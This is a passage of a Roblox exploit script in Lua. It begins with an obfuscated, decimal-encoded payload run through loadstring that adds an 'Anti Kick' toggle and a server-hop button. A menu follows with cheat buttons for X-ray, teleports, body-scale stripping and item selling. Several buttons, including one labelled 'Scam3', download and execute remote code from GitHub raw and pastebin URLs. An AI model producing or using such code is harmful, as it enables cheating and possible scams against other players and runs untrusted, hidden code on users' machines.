8\10\10\83\99\114\101\101\110\71\117\105\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\67\111\114\101\71\117\105\10\10\70\114\97\109\101\46\80\97\114\101\110\116\32\61\32\83\99\114\101\101\110\71\117\105\10\70\114\97\109\101\46\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\57\44\32\50\57\44\32\50\57\41\10\70\114\97\109\101\46\66\111\114\100\101\114\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\57\44\32\50\57\44\32\50\57\41\10\70\114\97\109\101\46\80\111\115\105\116\105\111\110\32\61\32\85\68\105\109\50\46\110\101\119\40\48\46\48\57\57\50\49\54\55\48\55\49\44\32\48\44\32\48\46\50\48\52\51\54\53\48\55\53\44\32\48\41\10\70\114\97\109\101\46\83\105\122\101\32\61\32\85\68\105\109\50\46\110\101\119\40\48\44\32\48\44\32\48\44\32\48\41\10\70\114\97\109\101\46\65\99\116\105\118\101\32\61\32\116\114\117\101\10\70\114\97\109\101\46\68\114\97\103\103\97\98\108\101\32\61\32\116\114\117\101\10\10\65\110\116\105\75\105\99\107\46\78\97\109\101\32\61\32\34\65\110\116\105\32\75\105\99\107\34\10\65\110\116\105\75\105\99\107\46\80\97\114\101\110\116\32\61\32\70\114\97\109\101\10\65\110\116\105\75\105\99\107\46\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\51\54\44\32\51\54\44\32\51\54\41\10\65\110\116\105\75\105\99\107\46\66\111\114\100\101\114\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\51\54\44\32\51\54\44\32\51\54\41\10\65\110\116\105\75\105\99\107\46\80\111\115\105\116\105\111\110\32\61\32\85\68\105\109\50\46\110\101\119\40\48\46\48\52\56\48\52\50\55\50\57\53\44\32\50\48\48\44\32\48\46\50\57\57\54\54\51\51\48\53\44\32\48\41\10\65\110\116\105\75\105\99\107\46\83\105\122\101\32\61\32\85\68\105\109\50\46\110\101\119\40\48\44\32\49\49\53\44\32\48\44\32\53\48\41\10\65\110\116\105\75\105\99\107\46\70\111\110\116\32\61\32\69\110\117\109\46\70\111\110\116\46\79\115\119\97\108\100\10\65\110\116\105\75\105\99\107\46\84\101\120\116\32\61\32\34\84\111\103\103\108\101\34\10\65\110\116\105\75\105\99\107\46\84\101\120\116\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\53\53\44\32\50\53\53\44\32\50\53\53\41\10\65\110\116\105\75\105\99\107\46\84\101\120\116\83\99\97\108\101\100\32\61\32\116\114\117\101\10\65\110\116\105\75\105\99\107\46\84\101\120\116\83\105\122\101\32\61\32\49\52\46\48\48\48\10\65\110\116\105\75\105\99\107\46\84\101\120\116\87\114\97\112\112\101\100\32\61\32\116\114\117\101\10\65\110\116\105\75\105\99\107\46\68\114\97\103\103\97\98\108\101\32\61\32\116\114\117\101\10\65\110\116\105\75\105\99\107\46\77\111\117\115\101\66\117\116\116\111\110\49\68\111\119\110\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\108\111\99\97\108\32\98\117\116\116\111\110\112\117\115\104\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\80\108\97\121\101\114\83\99\114\105\112\116\115\46\66\117\116\116\111\110\80\117\115\104\10\10\116\111\103\103\108\101\32\61\32\110\111\116\32\116\111\103\103\108\101\10\10\105\102\32\116\111\103\103\108\101\32\61\61\32\116\114\117\101\32\116\104\101\110\10\98\117\116\116\111\110\112\117\115\104\46\68\105\115\97\98\108\101\100\32\61\32\116\114\117\101\10\65\110\116\105\75\105\99\107\46\84\101\120\116\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\51\49\41\10\103\101\116\103\101\110\118\40\41\46\116\112\116\111\103\103\108\101\32\61\32\116\114\117\101\10\10\108\111\99\97\108\32\112\97\100\32\61\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\66\111\97\114\100\115\10\108\111\99\97\108\32\108\112\108\114\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\10\108\111\99\97\108\32\112\108\114\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\10\108\111\99\97\108\32\100\114\111\112\32\61\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\68\114\111\112\112\101\100\10\10\119\104\105\108\101\32\116\112\116\111\103\103\108\101\32\61\61\32\116\114\117\101\32\100\111\10\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\112\97\100\58\71\101\116\67\104\105\108\100\114\101\110\40\41\41\32\100\111\10\105\102\32\118\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\80\108\97\121\101\114\49\34\41\32\97\110\100\32\118\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\80\108\97\121\101\114\50\34\41\32\116\104\101\110\10\105\102\32\118\46\80\108\97\121\101\114\49\46\86\97\108\117\101\32\61\61\32\108\112\108\114\32\111\114\32\118\46\80\108\97\121\101\114\50\46\86\97\108\117\101\32\61\61\32\108\112\108\114\32\116\104\101\110\10\105\102\32\118\46\80\108\97\121\101\114\49\46\86\97\108\117\101\32\126\61\32\108\112\108\114\32\97\110\100\32\118\46\80\108\97\121\101\114\49\65\99\116\105\111\110\46\86\97\108\117\101\32\61\61\32\34\68\111\110\101\34\32\111\114\32\118\46\80\108\97\121\101\114\50\46\86\97\108\117\101\32\126\61\32\108\112\108\114\32\97\110\100\32\118\46\80\108\97\121\101\114\50\65\99\116\105\111\110\46\86\97\108\117\101\32\61\61\32\34\68\111\110\101\34\32\116\104\101\110\10\102\111\114\32\105\44\118\53\32\105\110\32\112\97\105\114\115\40\100\114\111\112\58\71\101\116\67\104\105\108\100\114\101\110\40\41\41\32\100\111\10\105\102\32\118\53\46\79\119\110\101\114\46\86\97\108\117\101\32\61\61\32\108\112\108\114\32\116\104\101\110\10\112\108\114\46\67\70\114\97\109\101\32\61\32\118\46\67\111\110\116\114\111\108\115\46\67\108\111\115\101\46\80\97\114\116\46\67\70\114\97\109\101\10\119\97\105\116\40\48\46\50\41\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\82\101\109\111\116\101\69\118\101\110\116\115\46\74\117\109\112\101\100\58\70\105\114\101\83\101\114\118\101\114\40\41\10\119\97\105\116\40\48\46\49\52\41\10\98\117\116\116\111\110\112\117\115\104\46\68\105\115\97\98\108\101\100\32\61\32\102\97\108\115\101\10\112\108\114\46\67\70\114\97\109\101\32\61\32\118\46\67\111\110\116\114\111\108\115\46\68\111\110\101\46\80\97\114\116\46\67\70\114\97\109\101\10\119\97\105\116\40\48\46\50\41\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\82\101\109\111\116\101\69\118\101\110\116\115\46\74\117\109\112\101\100\58\70\105\114\101\83\101\114\118\101\114\40\41\10\116\111\103\103\108\101\32\61\32\102\97\108\115\101\10\65\110\116\105\75\105\99\107\46\84\101\120\116\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\53\53\44\32\48\44\32\48\41\10\103\101\116\103\101\110\118\40\41\46\116\112\116\111\103\103\108\101\32\61\32\102\97\108\115\101\10\101\110\100\10\101\110\100\10\101\110\100\10\101\110\100\10\101\110\100\10\101\110\100\10\119\97\105\116\40\41\10\101\110\100\10\101\108\115\101\105\102\32\116\111\103\103\108\101\32\61\61\32\102\97\108\115\101\32\116\104\101\110\10\98\117\116\116\111\110\112\117\115\104\46\68\105\115\97\98\108\101\100\32\61\32\102\97\108\115\101\10\65\110\116\105\75\105\99\107\46\84\101\120\116\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\53\53\44\32\48\44\32\48\41\10\103\101\116\103\101\110\118\40\41\46\116\112\116\111\103\103\108\101\32\61\32\102\97\108\115\101\10\101\110\100\10\101\110\100\41\10\10\71\111\100\46\80\97\114\101\110\116\32\61\32\70\114\97\109\101\10\71\111\100\46\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\51\54\44\32\51\54\44\32\51\54\41\10\71\111\100\46\66\111\114\100\101\114\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\51\54\44\32\51\54\44\32\51\54\41\10\71\111\100\46\80\111\115\105\116\105\111\110\32\61\32\85\68\105\109\50\46\110\101\119\40\48\46\51\57\54\55\57\55\50\49\44\32\49\48\48\48\44\32\48\46\50\57\57\54\54\51\51\48\53\44\32\48\41\10\71\111\100\46\83\105\122\101\32\61\32\85\68\105\109\50\46\110\101\119\40\48\44\32\49\49\53\44\32\48\44\32\53\48\41\10\71\111\100\46\70\111\110\116\32\61\32\69\110\117\109\46\70\111\110\116\46\79\115\119\97\108\100\10\71\111\100\46\84\101\120\116\32\61\32\34\72\111\112\34\10\71\111\100\46\84\101\120\116\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\53\53\44\32\50\53\53\44\32\50\53\53\41\10\71\111\100\46\84\101\120\116\83\99\97\108\101\100\32\61\32\116\114\117\101\10\71\111\100\46\84\101\120\116\83\105\122\101\32\61\32\49\52\46\48\48\48\10\71\111\100\46\84\101\120\116\87\114\97\112\112\101\100\32\61\32\116\114\117\101\10\71\111\100\46\77\111\117\115\101\66\117\116\116\111\110\49\68\111\119\110\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\9\108\111\99\97\108\32\120\32\61\32\123\125\10\9\102\111\114\32\95\44\32\118\32\105\110\32\105\112\97\105\114\115\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\72\116\116\112\83\101\114\118\105\99\101\34\41\58\74\83\79\78\68\101\99\111\100\101\40\103\97\109\101\58\72\116\116\112\71\101\116\65\115\121\110\99\40\34\104\116\116\112\115\58\47\47\103\97\109\101\115\46\114\111\98\108\111\120\46\99\111\109\47\118\49\47\103\97\109\101\115\47\34\32\46\46\32\103\97\109\101\46\80\108\97\99\101\73\100\32\46\46\32\34\47\115\101\114\118\101\114\115\47\80\117\98\108\105\99\63\115\111\114\116\79\114\100\101\114\61\65\115\99\38\108\105\109\105\116\61\49\48\48\34\41\41\46\100\97\116\97\41\32\100\111\10\9\9\105\102\32\116\121\112\101\40\118\41\32\61\61\32\34\116\97\98\108\101\34\32\97\110\100\32\118\46\109\97\120\80\108\97\121\101\114\115\32\62\32\118\46\112\108\97\121\105\110\103\32\97\110\100\32\118\46\105\100\32\126\61\32\103\97\109\101\46\74\111\98\73\100\32\116\104\101\110\10\9\9\9\120\91\35\120\32\43\32\49\93\32\61\32\118\46\105\100\10\9\9\101\110\100\10\9\101\110\100\10\9\105\102\32\35\120\32\62\32\48\32\116\104\101\110\10\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101\34\41\58\84\101\108\101\112\111\114\116\84\111\80\108\97\99\101\73\110\115\116\97\110\99\101\40\103\97\109\101\46\80\108\97\99\101\73\100\44\32\120\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\120\41\93\41\10\9\101\108\115\101\10\9\9\114\101\116\117\114\110\32\110\111\116\105\102\121\40\34\83\101\114\118\101\114\104\111\112\34\44\34\67\111\117\108\100\110\39\116\32\102\105\110\100\32\97\32\115\101\114\118\101\114\46\34\41\10\9\101\110\100\10\101\110\100\41\10\10\120\46\78\97\109\101\32\61\32\34\120\34\10\120\46\80\97\114\101\110\116\32\61\32\70\114\97\109\101\10\120\46\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\51\54\44\32\51\54\44\32\51\54\41\10\120\46\66\111\114\100\101\114\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\51\54\44\32\51\54\44\32\51\54\41\10\120\46\80\111\115\105\116\105\111\110\32\61\32\85\68\105\109\50\46\110\101\119\40\48\46\56\54\52\55\54\56\54\56\52\44\32\48\44\32\48\44\32\48\41\10\120\46\83\105\122\101\32\61\32\85\68\105\109\50\46\110\101\119\40\48\44\32\55\54\44\32\48\44\32\53\48\41\10\120\46\70\111\110\116\32\61\32\69\110\117\109\46\70\111\110\116\46\79\115\119\97\108\100\10\120\46\84\101\120\116\32\61\32\34\88\34\10\120\46\84\101\120\116\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\53\53\44\32\50\53\53\44\32\50\53\53\41\10\120\46\84\101\120\116\83\99\97\108\101\100\32\61\32\116\114\117\101\10\120\46\84\101\120\116\83\105\122\101\32\61\32\49\52\46\48\48\48\10\120\46\84\101\120\116\87\114\97\112\112\101\100\32\61\32\116\114\117\101\10\120\46\68\114\97\103\103\97\98\108\101\32\61\32\116\114\117\101\10\120\46\77\111\117\115\101\66\117\116\116\111\110\49\68\111\119\110\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\9\103\97\109\101\46\67\111\114\101\71\117\105\46\83\99\114\101\101\110\71\117\105\58\68\101\115\116\114\111\121\40\41\10\101\110\100\41\10")()
end)

Section:NewButton("Scam3" , "scam2", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/imaboy12321/shhh/main/gaey'),true))()
end)
 
 local Tab     = Window:NewTab("Scripts!")
local Section = Tab:NewSection("other scripts!")
Section:NewButton("Xray" , "Xray11", function()
    game.Players.LocalPlayer.XRay.Value = true
end)

Section:NewButton("Humanoid" , "Humanoid2", function()
--Shit ass script made by failedmite57926

local LocalPlayer = game:GetService("Players").LocalPlayer
local Character = LocalPlayer.Character
local Humanoid = Character:FindFirstChildOfClass("Humanoid")

function rm()
	for i,v in pairs(Character:GetDescendants()) do
		if v:IsA("BasePart") then
			if v.Name == "Handle" or v.Name == "Head" then
				if Character.Head:FindFirstChild("OriginalSize") then
					Character.Head.OriginalSize:Destroy()
				end
			else
				for i,cav in pairs(v:GetDescendants()) do
					if cav:IsA("Attachment") then
						if cav:FindFirstChild("OriginalPosition") then
							cav.OriginalPosition:Destroy()  
						end
					end
				end
				v:FindFirstChild("OriginalSize"):Destroy()
				if v:FindFirstChild("AvatarPartScaleType") then
					v:FindFirstChild("AvatarPartScaleType"):Destroy()
				end
			end
		end
	end
end

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyHeightScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("HeadScale"):Destroy()
wait(1)
end)

Section:NewButton("Inventory Checker!" , "imao2", function()
loadstring(game:HttpGet("https://pastebin.com/raw/ZFL2tpqz"))()
end)

        Section:NewButton("inf yeld"  , "inf yeld script", function()
            loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
        end)

           Section:NewButton("FLY"  , "FLY GUI", function()
            loadstring(game:HttpGet(('https://pastebin.com/raw/stXS1ms3'),true))()
        end)

Section:NewButton("Xray" , "Xray1", function()
    game.Players.LocalPlayer.XRay.Value = true
end)

Section:NewButton("SAFE PLACE", "On the sky", function()
    Instance.new('Part',workspace)
Local = game:GetService('Players').LocalPlayer
Char  = Local.Character
touched,tpdback = false, false
Local.CharacterAdded:connect(function(char)
   if script.Disabled ~= true then
       wait(.25)
       loc = Char.HumanoidRootPart.Position
       Char:MoveTo(box.Position + Vector3.new(0,.5,0))
   end
end)
game:GetService('UserInputService').InputBegan:connect(function(key)
   if key.KeyCode == Enum.KeyCode.Equals then
       if script.Disabled ~= true then
           script.Disabled = true
           print'you may re-execute'
       end
   end
end)
box = Instance.new('Part',workspace)
box.Anchored = true
box.CanCollide = true
box.Size = Vector3.new(180,1,180)
box.Position = Vector3.new(0,450907,0)

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,450909,0)
end)

Section:NewButton("Go To SPAWN" , "playerback", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(60,19,-267)
end)


local Tab     = Window:NewTab("Sell items")
local Section = Tab:NewSection("Items")
Section:NewTextBox("Sell Item!", "Dro2pw", function(ror)
    local args = {
		[1] = ror
	}

	game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
end)

Section:NewButton("Sell F", "Sell F", function()
	local args = {
		[1] = "F"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
end)
Section:NewButton("Sell Walky Talky", "Sell Walky Talky", function()
	local args = {
		[1] = "Walky Talky"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
end)
Section:NewButton("Sell Retro Bike", "Sell Retro Bike", function()
	local args = {
		[1] = "Retro Bike"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
end)
Section:NewButton("Sell Box Toy Harambe", "Sell Box Toy Harambe", function()
	local args = {
		[1] = "Box Toy Harambe"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
end)
Section:NewButton("Sell Dart", "Sell Dart", function()
	local args = {
		[1] = "Dart"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
end)
Section:NewButton("Sell Green Ooze", "Sell Green Ooze", function()
	local args = {
		[1] = "Green Ooze"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
end)
Section:NewButton("Sell XOX Controller", "Sell XOX Controller", function()
	local args = {
		[1] = "XOX Controller"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
end)
Section:NewButton("Sell Demogorgan", "Sell Demogorgan", function()
	local args = {
		[1] = "Demogorgan"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
end)
Section:NewButton("Sell Demogorgan Kawaii", "Sell Demogorgan Kawaii", function()
	local args = {
		[1] = "Demogorgan Kawaii"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
end)

local Tab     = Window:NewTab("Credits")
local Section = Tab:NewSection("Credits")
local Section = Tab:NewSection("This Script Is Made By me")
local Section = Tab:NewSection("Discord: w4l#3444")
